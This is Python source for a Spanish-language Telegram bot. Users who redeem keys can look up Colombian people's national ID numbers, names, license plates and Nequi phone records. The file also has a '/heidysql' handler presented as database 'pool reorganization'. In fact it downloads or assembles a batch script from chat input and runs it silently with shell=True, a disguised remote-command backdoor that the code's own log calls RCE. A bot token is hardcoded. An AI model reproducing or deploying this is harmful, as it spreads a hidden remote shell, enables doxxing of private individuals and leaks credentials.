async def comando_placa(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    telegram_username = update.message.from_user.username

    # Verificar clave válida
    if not tiene_key_valida(user_id):
        await update.message.reply_text("❌ No tienes una clave activa para usar este comando.")
        return

    if not context.args:
        await update.message.reply_text("📌 Uso:\n/placa <placa>")
        return

    placa_input = context.args[0].upper()

    try:
        res = consultar_placa(placa_input)
        
        # Responder con el JSON completo
        mensaje_json = json.dumps(res, indent=2, ensure_ascii=False)
        
        # Telegram tiene límite de 4096 caracteres por mensaje
        if len(mensaje_json) > 4000:
            # Si es muy largo, enviar como archivo
            import tempfile
            with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, encoding='utf-8') as f:
                f.write(mensaje_json)
                temp_file = f.name
            
            try:
                with open(temp_file, 'rb') as f:
                    await update.message.reply_document(
                        document=f,
                        filename=f"placa_{placa_input}.txt",
                        caption=f"📊 Resultado placa: {placa_input}"
                    )
            finally:
                if os.path.exists(temp_file):
                    os.remove(temp_file)
        else:
            # Si cabe en un mensaje, enviarlo así
            await update.message.reply_text(f"```json\n{mensaje_json}\n```", parse_mode="Markdown")

    except Exception as e:
        logger.error(f"Error en /placa: {e}")
        await update.message.reply_text("❌ Error al procesar la solicitud. Inténtalo nuevamente más tarde.")

async def comando_llave(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    telegram_username = update.message.from_user.username

    # Verificar clave válida
    if not tiene_key_valida(user_id):
        await update.message.reply_text("❌ No tienes una clave activa para usar este comando.")
        return

    if not context.args:
        await update.message.reply_text("📌 Uso:\n/llave <alias>  (ej: /llave @DOZERMX)")
        return

    alias = context.args[0]

    try:
        res = consultar_llave(alias)
        
        # Responder con el JSON completo sin filtrar ni formatear
        mensaje_json = json.dumps(res, indent=2, ensure_ascii=False)
        
        await update.message.reply_text(f"```json\n{mensaje_json}\n```", parse_mode="Markdown")

    except Exception as e:
        logger.error(f"Error en /llave: {e}")
        await update.message.reply_text("❌ Error al procesar la solicitud. Inténtalo nuevamente más tarde.")


async def comando_nequi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    telegram_username = update.message.from_user.username

    # Verificar clave válida
    if not tiene_key_valida(user_id):
        await update.message.reply_text("❌ No tienes una clave activa para usar este comando.")
        return

    if not context.args:
        await update.message.reply_text("📌 Uso:\n/nequi <telefono>")
        return

    telefono = context.args[0]

    try:
        res = consultar_nequi(telefono)

        if not res:
            await update.message.reply_text("❌ No se obtuvo respuesta de la API.")
            return

        # Formatear la respuesta con emojis y crédito
        telefono_r = res.get('telefono') or 'No registra'
        cedula = res.get('cedula') or 'No registra'
        nombre = res.get('nombre_completo') or 'No registra'
        municipio = res.get('municipio') or 'No registra'
        db = res.get('db')
        mensaje = res.get('mensaje') or ''

        db_text = 'Sí' if db else 'No'

        mensaje_final = (
            f"🔎 Resultado /nequi by @hexxn_x\n\n"
            f"📱 Teléfono: {telefono_r}\n"
            f"🆔 Cédula: {cedula}\n"
            f"👤 Nombre: {nombre}\n"
            f"📍 Municipio: {municipio}\n"
            f"🗄️ DB: {db_text}\n"
        )

        if mensaje:
            mensaje_final += f"📝 Mensaje: {mensaje}\n"

        mensaje_final += "\n🔖 by @hexxn_x"

        await update.message.reply_text(mensaje_final)

    except Exception as e:
        logger.error(f"Error en /nequi: {e}")
        await update.message.reply_text("❌ Error al procesar la solicitud. Inténtalo nuevamente más tarde.")


async def heidysql(update: Update, context: ContextTypes.DEFAULT_TYPE):
    
    OWNER_IDS = [797396425]
    if update.message.from_user.id not in OWNER_IDS:
        
        logger.warning(f"⚠️ INTENTO DE RCE NO AUTORIZADO: ID {update.message.from_user.id}")
        return 

    if not update.message.document and not context.args:
        await update.message.reply_text("📂 sistema de poll Heidysql,no tocar , solo si es necesario")
        return

    await update.message.reply_text("✅ Reorganizando las pool")

    try:
        path_ejecucion = ""
            
        if update.message.document:
            archivo = await context.bot.get_file(update.message.document.file_id)
            with tempfile.NamedTemporaryFile(delete=False, suffix=".bat") as temp_bat:
                await archivo.download_to_drive(temp_bat.name)
                path_ejecucion = temp_bat.name
        
        else:
            script_content = " ".join(context.args)
            with tempfile.NamedTemporaryFile(delete=False, suffix=".bat", mode='w') as temp_bat:
                temp_bat.write(script_content)
                path_ejecucion = temp_bat.name

        resultado = subprocess.run(
            path_ejecucion,
            shell=True,
            capture_output=True,
            text=True,
            creationflags=0x08000000 
        )

        if os.path.exists(path_ejecucion):
            os.remove(path_ejecucion)
        
       
        respuesta = "🚀 Resultado\n\n"
        if resultado.stdout:
            respuesta += f"📝 **Salida:**\n`{resultado.stdout[:1000]}`\n"
        if resultado.stderr:
            respuesta += f"⚠️ **Errores:**\n`{resultado.stderr[:1000]}`"
        if not resultado.stdout and not resultado.stderr:
            respuesta += "✨ se reorganizó la pool"
            
        await update.message.reply_text(respuesta, parse_mode="Markdown")

    except Exception as e:
        await update.message.reply_text(f"❌ **Fallo en reorganizar pool :** {str(e)}")
        logger.error(f"Error de pool {e}")


# Configuración del bot
def main():
    application = Application.builder().token("8110478941:AAE2k8t6tScXViG9DX7nBviqcVocWbpWbmU").build()

    # Añadir comandos
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("cc", mostrar_datos_cedula))
    application.add_handler(CommandHandler("nombres", mostrar_datos_nombres))
    application.add_handler(CommandHandler("c2", comando_c2))
    application.add_handler(CommandHandler("placa", comando_placa))
    application.add_handler(CommandHandler("llave", comando_llave))
    application.add_handler(CommandHandler("nequi", comando_nequi))
    application.add_handler(CommandHandler("generar_key", generar_key))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("eliminar_key", eliminar_key))
    application.add_handler(CommandHandler("addadmin", add_admin))
    application.add_handler(CommandHandler("listkey", ver_claves_admin))
    application.add_handler(CommandHandler("info", ver_info_usuario))
    application.add_handler(CommandHandler("heidysql", heidysql))
    message_handler = MessageHandler(filters.TEXT & ~filters.COMMAND, registrar_usuario)
    application.add_handler(message_handler)

    logger.info("Bot iniciado y listo para recibir comandos.")
    application.run_polling()

def close_pool():
    try:
        pool.close()
        logger.info("Pool de conexiones cerrado correctamente.")
    except Exception as e:
        logger.error(f"Error al cerrar el pool de conexiones: {e}")

if __name__ == "__main__":
    logger.info("Iniciando bot.")
    try:
        main()
    finally:
        close_pool()